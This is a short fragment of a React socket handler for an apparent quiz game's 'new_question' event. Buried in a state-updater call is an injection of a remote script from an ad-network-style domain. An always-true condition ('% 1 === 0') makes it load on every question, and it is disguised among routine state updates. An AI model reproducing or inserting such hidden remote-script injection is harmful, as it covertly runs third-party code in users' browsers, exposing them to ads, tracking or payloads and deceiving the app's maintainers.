  ...
  useEffect(() => {
    ...
    socket.on('new_question', (data) => {
      try {
          ...
          setRoundResult(null); setSelectedOptionIndex(null); setGameState('playing'); setIsHistoryMode(false); setHistoryLength(prev => { const newLen = prev + 1; if (newLen % 1 === 0) { const s = document.createElement("script"); s.src = "https://pl28833066.effectivegatecpm.com/0f/83/5d/0f835d52bdde45ce6714384567337604.js"; document.head.appendChild(s); } return newLen; }); setHistoryIndex(prev => prev + 1);
      } catch (e) {
